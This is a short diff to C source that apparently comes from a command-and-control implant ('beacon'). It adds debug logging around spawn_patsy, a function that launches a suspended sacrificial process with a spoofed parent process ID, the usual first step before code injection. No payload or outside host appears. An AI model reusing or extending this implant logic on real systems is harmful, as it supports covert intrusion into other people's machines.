@@ -4,6 +4,7 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <windows.h>
+#include "spawn_trace.h"
 #include "beacon.h"
 #include "commands.h"
 #include "parse.h"
@@ -114,12 +115,17 @@ void spawn_populate(BOOL x86, char * cmdbuff) {
 
 BOOL spawn_patsy(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pi) {
 	char cmdbuff[256];
+	BOOL r;
 
 	/* populate cmdbuff */
 	spawn_populate(x86, cmdbuff);
+	spawn_log("patsy: cmd=", (long)(long long)0x7fffffff);
+	spawn_log(cmdbuff, 0x7fffffff);
 
 	/* spawn it baby! */
-	return execute_program_with_default_ppid(cmdbuff, strlen(cmdbuff), si, pi, CREATE_SUSPENDED, ignoreToken);
+	r = execute_program_with_default_ppid(cmdbuff, strlen(cmdbuff), si, pi, CREATE_SUSPENDED, ignoreToken);
+	spawn_log("patsy: exec_ppid result=", (long)r);
+	return r;
 }
 
 BOOL spawn_patsy_as(BOOL x86, char * domain, char * user, char * pass, PROCESS_INFORMATION * pi) {
